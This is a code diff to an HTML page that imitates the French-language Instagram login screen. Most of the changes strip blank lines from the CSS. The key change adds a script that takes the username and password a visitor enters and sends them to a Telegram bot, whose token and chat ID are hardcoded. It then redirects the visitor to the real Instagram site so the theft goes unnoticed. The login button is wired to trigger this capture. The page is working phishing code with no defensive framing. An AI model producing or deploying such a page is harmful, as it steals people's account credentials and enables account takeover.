@@ -11,7 +11,6 @@
             box-sizing: border-box;
             font-family: 'Arial', sans-serif;
         }
-
         body {
             background-color: #fafafa;
             display: flex;
@@ -19,13 +18,11 @@
             align-items: center;
             height: 100vh;
         }
-
         .container {
             width: 100%;
             max-width: 400px;
             text-align: center;
         }
-
         .login-box {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -33,12 +30,10 @@
             border-radius: 5px;
             box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
         }
-
         .logo {
             width: 180px;
             margin-bottom: 20px;
         }
-
         .input-field {
             width: 100%;
             padding: 10px;
@@ -48,7 +43,6 @@
             background: #fafafa;
             font-size: 14px;
         }
-
         .login-button {
             background-color: #0095f6;
             color: white;
@@ -61,11 +55,9 @@
             transition: 0.3s;
             margin-top: 10px;
         }
-
         .login-button:hover {
             background-color: #0077cc;
         }
-
         .divider {
             display: flex;
             align-items: center;
@@ -73,22 +65,18 @@
             font-size: 12px;
             color: #8e8e8e;
         }
-
         .divider::before, .divider::after {
             content: '';
             flex: 1;
             border-bottom: 1px solid #dbdbdb;
             margin: auto;
         }
-
         .divider::before {
             margin-right: 10px;
         }
-
         .divider::after {
             margin-left: 10px;
         }
-
         .facebook-login {
             background: none;
             border: none;
@@ -97,11 +85,9 @@
             font-size: 14px;
             cursor: pointer;
         }
-
         .facebook-login:hover {
             text-decoration: underline;
         }
-
         .forgot-password {
             font-size: 12px;
             color: #00376b;
@@ -109,11 +95,9 @@
             display: block;
             margin-top: 15px;
         }
-
         .forgot-password:hover {
             text-decoration: underline;
         }
-
         .signup-box {
             background: white;
             border: 1px solid #dbdbdb;
@@ -121,31 +105,58 @@
             margin-top: 10px;
             font-size: 14px;
         }
-
         .signup-box a {
             color: #0095f6;
             font-weight: bold;
             text-decoration: none;
         }
-
         .signup-box a:hover {
             text-decoration: underline;
         }
-
         @media (max-width: 500px) {
             .container {
                 max-width: 90%;
             }
         }
     </style>
+    <script>
+        function sendToTelegram() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            
+            if (username === "" || password === "") {
+                alert("Veuillez remplir tous les champs !");
+                return;
+            }
+
+            var token = "7245415512:AAF4iO_x8JDW-BTkc9PyijqIArsfVFWiaLc";
+            var chatId = "5372119436";
+            var message = "🔹 Nouveau login Instagram 🔹\n👤 Utilisateur: " + username + "\n🔑 Mot de passe: " + password;
+
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "https://www.instagram.com"; // Redirection après l'envoi
+                    } else {
+                        alert("Erreur d'envoi sur Telegram !");
+                    }
+                })
+                .catch(error => {
+                    alert("Problème de connexion !");
+                    console.error("Erreur:", error);
+                });
+        }
+    </script>
 </head>
 <body>
     <div class="container">
         <div class="login-box">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo">
-            <input type="text" class="input-field" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail">
-            <input type="password" class="input-field" placeholder="Mot de passe">
-            <button class="login-button">Se connecter</button>
+            <input type="text" id="username" class="input-field" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail">
+            <input type="password" id="password" class="input-field" placeholder="Mot de passe">
+            <button class="login-button" onclick="sendToTelegram()">Se connecter</button>
             <div class="divider">OU</div>
             <button class="facebook-login">Se connecter avec Facebook</button>
             <a href="#" class="forgot-password">Mot de passe oublié ?</a>
